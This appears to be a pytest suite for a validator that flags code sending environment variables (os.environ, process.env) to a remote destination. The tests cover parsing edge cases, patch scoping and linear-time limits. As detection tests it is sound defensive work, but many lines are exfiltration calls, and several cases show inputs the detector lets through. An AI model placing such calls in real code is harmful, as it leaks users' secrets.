    "start_stop_pairs": lambda n: lengthen("p.start()\np.stop()\n", n,
                                           PATCH_HEAD + "p = patch('requests.post')\n", SEND_TAIL),
    "start_only": lambda n: lengthen("p.start()\n", n, PATCH_HEAD + "p = patch('requests.post')\n", SEND_TAIL),
    "stopall_flood": lambda n: lengthen('patch("a.b").start()\npatch.stopall()\n', n, PATCH_HEAD, SEND_TAIL),
    "function_flood": lambda n: lengthen('def f():\n    with patch("a.b"):\n        pass\n', n, PATCH_HEAD, SEND_TAIL),
    "decorator_flood": lambda n: lengthen('@patch("a.b")\n', n, PATCH_HEAD, "def f():\n    " + SEND_TAIL),
    "headers_without_colon": lambda n: lengthen("with a, b, c, d\n", n, tail=SEND_TAIL),
    "callee_dots": lambda n: lengthen("requests.get.", n, tail="post(u, json=os.environ)\n"),
    "callee_dots_with_gaps": lambda n: lengthen("requests. ", n, tail="post(u, json=os.environ)\n"),
    "callee_constructors": lambda n: lengthen("requests.Session().", n, tail="post(u, json=os.environ)\n"),
    "round_brackets": lambda n: "import os, requests\n" + "f(" * (n // 4) + "os.environ" + ")" * (n // 4) + "\n" + SEND_TAIL,
    "open_square_brackets": lambda n: "import os, requests\n" + "[" * (n // 2) + "\n" + SEND_TAIL,
    "fences": lambda n: lengthen("```py\nx = 1\n```\n", n, "", "```py\n" + SEND_TAIL + "```\n"),
    "divisions": lambda n: lengthen("x = a / b; ", n, tail="\n" + SEND_TAIL),
    "regex_literals": lambda n: lengthen("x = /a/g; y = z / 2; ", n, tail="\n" + SEND_TAIL),
    "string_pieces": lambda n: lengthen('s = f"{x}{{y}}" + `${z}`; ', n, tail="\n" + SEND_TAIL),
    "block_comments": lambda n: lengthen("/* a\n b */ x = 1\n", n, tail=SEND_TAIL),
    "unfinished_string": lambda n: 'import os, requests\n"' + "x" * n + "\n" + SEND_TAIL,
    "unfinished_triple": lambda n: 'import os, requests\n"""' + "x\n" * (n // 2) + "\n" + SEND_TAIL,
    "many_calls": lambda n: lengthen(SEND_TAIL, n),
    "calls_inside_calls": lambda n: ("import os, requests\n" + "requests.post(u, f(os.environ['A'], " * (n // 40)
                                     + "1" + "))" * (n // 40) + "\n"),
    "many_environments_in_one_argument": lambda n: ("import os, requests\nrequests.post(u, json=["
                                                    + "os.environ['A'], " * (n // 20) + "])\n"),
    "regex_classes_unfinished": lambda n: lengthen("x = /[; ", n, tail="\n" + SEND_TAIL),
    "dotted_mock_factory_names": lambda n: lengthen("fn.", n, "import os, requests\nx = a.", "z\n" + SEND_TAIL),
    "dotted_factory_assignment_both_sides": lambda n: ("import os, requests\n" + "q." * (n // 16) + "q = a." + "fn." * (n // 16)
                                                      + "z\n" + SEND_TAIL),
    "long_wrapper_many_arguments": lambda n: ("import os, requests\nrequests.post(u, " + "w." * (n // 40) + "run("
                                              + "os.environ, " * (n // 40) + "))\n"),
    "long_assignment_targets": lambda n: lengthen(", ".join(["a"] * 31) + " = x\n", n, tail=SEND_TAIL),
    "wrapped_managers": lambda n: lengthen("with " + "(" * 150 + 'patch("a.b")' + ")" * 150 + ":\n    pass\n", n,
                                           PATCH_HEAD, SEND_TAIL),
    "wrapped_bindings": lambda n: lengthen("p = " + "(" * 150 + 'patch("a.b")' + ")" * 150 + "\n", n,
                                           PATCH_HEAD, "p.start()\n" + SEND_TAIL),
    "wrapped_starts": lambda n: lengthen("(" * 150 + 'patch("a.b")' + ")" * 150 + ".start()\n", n,
                                         PATCH_HEAD, SEND_TAIL),
    # the depth grows with the size: n characters are about isqrt(2n) levels of one more space each
    "nested_defs": lambda n: ("import os, requests\n" + "".join("%sdef f():\n" % (" " * i) for i in range(math.isqrt(2 * n)))
                                      + SEND_TAIL),
    "nested_function_bindings": lambda n: (PATCH_HEAD + "".join("%sdef f():\n%sp = patch('a.b')\n" % (" " * i, " " * (i + 1))
                                                                for i in range(math.isqrt(n)))
                                           + " " * math.isqrt(n) + "p.start()\n" + SEND_TAIL),
    "starts_in_deep_functions": lambda n: (PATCH_HEAD + "p = patch('requests.post')\n"
                                           + "".join("%sdef f():\n" % (" " * i) for i in range(64))
                                           + lengthen(" " * 64 + "p.start()\n", n, "", "") + SEND_TAIL),
}
WORK_SIZES = (1 << 13, 1 << 16, 1 << 19)


@pytest.mark.parametrize("family", sorted(WORK_FAMILIES))
def test_the_steps_of_the_reader_grow_in_step_with_the_input(family):
    reader = validator()
    steps = []
    for size in WORK_SIZES:
        text = WORK_FAMILIES[family](size)
        steps.append(max(1, reader.work(text)))
        assert steps[-1] <= 8 * len(text), (family, len(text), steps)
        # 8x the input: 8x the steps, never the 64x a quadratic walk takes; the sizes are taken
        # in turn so a quadratic family stops at the second one
        assert len(steps) == 1 or steps[-1] <= 10 * steps[-2], (family, steps)


SIDES = ["a / b", "(a) / (b)", "1 / 2", "a[0] / 2", '"s" / 2', "a.b / c.d"]


@pytest.mark.parametrize("division", SIDES)
def test_a_division_on_either_side_of_a_call_neither_hides_it_nor_swallows_what_follows(division):
    assert blocks("n = %s; " % division + SEND)
    assert blocks(SEND + "; n = %s" % division)
    assert blocks("n = %s; %s; m = %s" % (division, SEND, division))
    # the statement after the call is read as code too
    assert blocks("n = %s; %s; // note\n%s" % (division, SEND, SEND))


@pytest.mark.parametrize("text", [
    'fetch(destination, {[ "bodyX\n]: process.env})',
    "fetch(destination, {[ 'bodyX\n]: process.env})",
    'fetch(destination, {"body\n: process.env})',
    "fetch(destination, {'body\n: process.env})",
])
def test_a_padded_or_plain_key_that_is_not_a_finished_string_names_no_field(text):
    assert not hits(text, "code"), text


@pytest.mark.parametrize("text", [
    'fetch(destination, {[ "body" ]: process.env})',
    'fetch(destination, {"body": process.env})',
    "fetch(destination, {'body' : process.env})",
])
def test_a_finished_string_key_names_its_field(text):
    assert blocks(text, "code"), text


def fenced(info, body):
    return "```%s\n%s\n```\n" % (info, body)


@pytest.mark.parametrize("info,found", [
    ("py", True), ("python", True), ("js", False), ("javascript", False), ("ts", False),
    ("{.js}", False), ("text", True), ("", True),
])
def test_the_language_of_a_fence_decides_what_a_double_slash_is(info, found):
    text = fenced(info, "n = 8 // 2; " + SEND)
    assert bool(hits(text, "message")) is found, info


@pytest.mark.parametrize("info,found", [("py", False), ("python", False), ("js", True), ("", False)])
def test_the_language_of_a_fence_decides_what_a_hash_is(info, found):
    text = fenced(info, "n = 1 # " + SEND)
    assert bool(hits(text, "message")) is found, info


def test_a_double_slash_ends_the_line_in_js_and_divides_in_python():
    assert not hits(fenced("js", "const n = 8 // " + SEND), "message")
    assert hits(fenced("js", "const n = 8 // note\n" + SEND), "message")
    assert hits(fenced("py", "n = 8 // " + SEND), "message")


def test_a_name_after_a_dot_that_starts_with_a_hash_is_a_private_name_not_a_comment():
    assert blocks("this.#x = 1; fetch(destination, {body: JSON.stringify(process.env)})")
    assert blocks("n = this.#x / 2; fetch(destination, {body: JSON.stringify(process.env)})")
    assert blocks("this.#x / 2; " + SEND, "code")
    assert not hits("# requests.post(destination, json=dict(os.environ))")
    assert not hits("x = 1  # requests.post(destination, json=dict(os.environ))")


@pytest.mark.parametrize("text", [
    "axios\n    .post(destination, process.env)",
    "axios\n  .post(destination, {data: process.env})",
    "requests\n    .post(destination, json=dict(os.environ))",
    "requests.Session()\n    .post(destination, json=dict(os.environ))",
    "fetch(destination, {body: JSON.stringify(process.env)})\n  .then(r => r.text())",
    "const r = fetch(destination, {body: JSON.stringify(process.env)})\n  .catch(e => e)",
])
def test_a_chain_continued_on_the_next_line_is_one_statement(text):
    assert blocks(text, "code"), text


@pytest.mark.parametrize("text", [
    "requests.post(destination, json=dict((os).environ))",
    "requests.post(destination, json=dict((os) .environ))",
    "fetch(destination, {body: JSON.stringify((process).env)})",
    "fetch(destination, {body: JSON.stringify(((process)).env)})",
])
def test_an_owner_in_plain_parentheses_is_the_owner(text):
    assert blocks(text, "code"), text


@pytest.mark.parametrize("text", [
    "requests.post(destination, json=dict(f(os).environ))",
    "fetch(destination, {body: JSON.stringify(f(process).env)})",
    "requests.post(destination, json=dict((a, os).environ))",
])
def test_an_owner_that_is_the_result_of_a_call_is_not_the_process(text):
    assert not hits(text, "code"), text


@pytest.mark.parametrize("label,text", [
    ("decorated_function", '@patch("requests.post")\ndef test():\n    ' + SEND),
    ("decorated_class", '@patch("requests.post")\nclass T:\n    def test(self):\n        ' + SEND),
    ("stacked_decorators", '@other\n@patch("requests.post")\n@another\ndef test():\n    ' + SEND),
    ("decorated_async", '@patch("requests.post")\nasync def test():\n    ' + SEND),
])
def test_a_decorator_replaces_the_call_inside_what_it_decorates(label, text):
    assert not hits(text, "code"), label


def test_a_decorated_body_ends_where_the_function_ends():
    text = '@patch("requests.post")\ndef test():\n    pass\n' + SEND
    assert blocks(text, "code")


PATCH_IMPORT = "import os, requests\nfrom unittest.mock import patch\n"


@pytest.mark.parametrize("label,text,clear", [
    ("with_header_over_a_trailing_comma",
     PATCH_IMPORT + 'with open(f) as a,\n     patch("requests.post"):\n    ' + SEND + "\n", True),
    ("with_header_over_a_trailing_comma_ends_with_the_block",
     PATCH_IMPORT + 'with open(f) as a,\n     patch("requests.post"):\n    pass\n' + SEND + "\n", False),
    ("binding_whose_value_starts_on_the_next_line",
     PATCH_IMPORT + 'p =\n    patch("requests.post")\np.start()\n' + SEND + "\n", True),
    ("binding_after_a_semicolon",
     PATCH_IMPORT + 'n = 1; p = patch("requests.post"); p.start()\n' + SEND + "\n", True),
    ("an_earlier_statement_is_not_the_binding",
     PATCH_IMPORT + 'p = 1; q = patch("requests.post"); q.stop()\n' + SEND + "\n", False),
    ("decorator_covers_its_own_method_only",
     PATCH_IMPORT + 'class T:\n    @patch("requests.post")\n    def a(self):\n        pass\n    def b(self):\n        '
     + SEND + "\n", False),
    ("decorator_covers_its_own_method",
     PATCH_IMPORT + 'class T:\n    def b(self):\n        pass\n    @patch("requests.post")\n    def a(self):\n        '
     + SEND + "\n", True),
    ("nested_function_ends_at_its_own_indentation",
     PATCH_IMPORT + 'def outer():\n    def inner():\n        with patch("requests.post"):\n            pass\n    ' + SEND + "\n",
     False),
], ids=lambda c: c if isinstance(c, str) and " " not in c and "(" not in c and len(c) < 70 else "t")
def test_statements_headers_and_block_ends_are_cut_from_the_tokens(label, text, clear):
    assert (not blocks(text, "code")) is clear, label


@pytest.mark.parametrize("info,found", [("py", True), ("js", False)])
def test_a_double_slash_after_an_operator_is_a_comment_only_in_js(info, found):
    assert bool(hits(fenced(info, "n = [1, // 2]; " + SEND), "message")) is found, info


@pytest.mark.parametrize("label,text,found", [
    ("hash_after_a_gapped_dot_is_a_comment", "n = a. #requests.post(destination, json=dict(os.environ))", False),
    ("hash_after_a_touching_dot_is_a_name", "n = a.#requests; " + SEND, True),
    ("catch_member_call_then_division", "n = p.catch(e) / 2; " + SEND + "; m = 1 / 2", True),
    ("if_member_call_then_division", "n = p.if(e) / 2; " + SEND + "; m = 1 / 2", True),
    ("while_member_call_then_division", "n = p.while(e) / 2; " + SEND + "; m = 1 / 2", True),
    ("control_paren_then_regex", "if (e) /x/.test(s); " + SEND, True),
    ("object_in_a_template_field", "`${ {a: 1}.a } x`; fetch(destination, {body: JSON.stringify(process.env)})", True),
    ("two_object_levels_in_a_template_field", "`${ {a: {b: 1}}.a } x`; " + SEND, True),
    ("triple_quoted_raw_string_over_lines", 's = r"""a\nb"""; ' + SEND, True),
    ("triple_quoted_f_string_over_lines", 's = f"""a\nb"""; ' + SEND, True),
    ("triple_quoted_bytes_over_lines", "s = b'''a\nb'''; " + SEND, True),
    ("triple_quoted_plain_over_lines", 's = """a\nb"""; ' + SEND, True),
    ("a_with_inside_a_bracket_is_no_block", 'n = (x, with patch("requests.post"): ' + SEND, True),
    ("a_def_inside_a_bracket_is_no_block", 'n = (x, def patch("requests.post"): ' + SEND, True),
    ("header_continued_by_a_leading_comma",
     PATCH_IMPORT + 'with open(f) as a\n    , patch("requests.post"):\n    ' + SEND + "\n", False),
    ("header_continued_by_a_leading_dot",
     PATCH_IMPORT + 'with open(f)\n    .or_none(), patch("requests.post"):\n    ' + SEND + "\n", False),
    ("header_continued_by_a_leading_question_mark",
     PATCH_IMPORT + 'with open(f)\n    ?? other, patch("requests.post"):\n    ' + SEND + "\n", False),
], ids=lambda c: c if isinstance(c, str) and " " not in c and "(" not in c and len(c) < 70 else "t")
def test_a_token_rule_decides_what_is_code_what_is_a_string_and_where_a_statement_ends(label, text, found):
    assert bool(blocks(text, "code")) is found, label


@pytest.mark.parametrize("text", [
    'patch("requests.post").stop()\n' + SEND,
    'patch("requests.post").object()\n' + SEND,
    'patch("requests.post").starting()\n' + SEND,
])
def test_only_a_start_call_on_a_built_patch_starts_it(text):
    assert blocks(text), text


@pytest.mark.parametrize("text", [
    'p = wrap(patch("requests.post"))\np.start()\n' + SEND,
    'p = other or patch("requests.post")\np.start()\n' + SEND,
])
def test_a_patch_inside_a_larger_expression_is_not_what_the_variable_holds(text):
    assert blocks(text), text


def test_a_patch_reached_through_a_module_name_is_what_the_variable_holds():
    assert not hits('p = mock.patch("requests.post")\np.start()\n' + SEND)


def test_a_patcher_is_the_variable_of_the_function_that_holds_the_assignment():
    assert not hits('p = patch("requests.post")\ndef f():\n    p = patch("httpx.get")\np.start()\n' + SEND)
    assert blocks('def f():\n    p = patch("requests.post")\np.start()\n' + SEND)


def test_a_class_body_variable_is_visible_in_the_class_body_and_not_in_its_methods():
    head = 'class T:\n    p = patch("requests.post")\n'
    assert not hits(head + "    p.start()\n    " + SEND)
    assert blocks(head + "    def f(self):\n        p.start()\n        " + SEND)


@pytest.mark.parametrize("text", [
    'fetch(destination, {"bodyX\n: process.env})',
    "fetch(destination, {'bodyX\n: process.env})",
])
def test_a_plain_key_whose_string_never_finishes_names_no_field(text):
    assert not hits(text, "code"), text


@pytest.mark.parametrize("text", [
    'x = a\n/"/.test(s); ' + SEND,
    "x = a\n/'/.test(s); " + SEND,
    'x = a\n/"""/.test(s); ' + SEND,
])
def test_a_regular_expression_literal_that_starts_a_line_is_one_token(text):
    assert blocks(text), text


@pytest.mark.parametrize("text", [
    'a. #note """\n' + SEND,
    "a. #note '''\n" + SEND,
])
def test_a_hash_that_does_not_touch_the_dot_before_it_is_a_comment(text):
    assert blocks(text), text


def nested_functions(depth):
    lines = ['p = patch("requests.post")']
    lines += [" " * i + "def f%d():" % i for i in range(depth)]
    return "\n".join(lines + [" " * depth + "p.start()", " " * depth + SEND]) + "\n"


@pytest.mark.parametrize("depth", [1, 16, 17, 64, 200])
def test_a_patcher_is_found_through_any_number_of_enclosing_functions(depth):
    assert not blocks(nested_functions(depth))


def wrapped_manager(layers):
    return ("with %spatch(\"requests.post\")%s:\n    requests.post(destination, json=os.environ)"
            % ("(" * layers, ")" * layers))


@pytest.mark.parametrize("layers", [1, 16, 17, 64, 200])
def test_a_manager_in_any_number_of_parentheses_is_entered(layers):
    assert not blocks(wrapped_manager(layers))


def rebound_by_target(tokens):
    """Sixteen names separated by commas make 31 tokens; a star adds one and a grouping adds two."""
    names = ["n%d" % i for i in range(15)] + ["p"]
    if tokens == 1:
        names = ["p"]
    elif tokens == 32:
        names[-1] = "*p"
    elif tokens == 33:
        names[0] = "(n0)"
    elif tokens == 34:
        names[0] = "(n0)"
        names[-1] = "*p"
    return ("p = patch(\"requests.post\")\n%s = ordinary\np.start()\n"
            "requests.post(destination, json=os.environ)" % ", ".join(names))


def test_an_assignment_target_is_read_to_thirty_two_tokens_and_not_beyond():
    # stated limit 11: the target of an assignment is read up to 32 tokens
    for tokens in (1, 31, 32):
        assert blocks(rebound_by_target(tokens)), tokens
    for tokens in (33, 34):
        assert not blocks(rebound_by_target(tokens)), tokens


@pytest.mark.parametrize("source,end", [
    ("/a/", 3), ("/a/g", 4), ("/[/]/", 5), ("/a\\/b/", 6), ("/a/gi;", 5),
    ("//", 0), ("//g", 3), ("/a", 0), ("/a\n/", 0), ("/[/", 0), ("/", 0),
])
def test_a_regular_expression_literal_has_a_body_and_closes_on_its_line(source, end):
    from sunglasses.validators import _regex_literal_end
    assert _regex_literal_end(source, 0, {}) == end


@pytest.mark.parametrize("text", [
    "x = //g\n" + 'fetch(destination, {body: process.env})',
])
def test_flags_after_two_slashes_belong_to_a_literal_of_unknown_language(text):
    # stated limit 6: in text of unknown language ``//g`` after an operator is read as a literal
    # with a flag, so the call on the next line is still code
    assert blocks(text)


def test_an_annotated_name_is_rebound_in_python_and_is_a_label_in_js():
    text = 'p = patch("requests.post")\np: object = ordinary\np.start()\n' + SEND
    assert hits(fenced("py", text), "message")
    assert not hits(fenced("js", text), "message")


def test_a_patch_call_that_ends_the_text_is_read_without_error():
    for tail in ('p = patch("requests.post")', '@patch("requests.post")', 'with patch("requests.post")'):
        assert blocks(SEND + "\n" + tail)
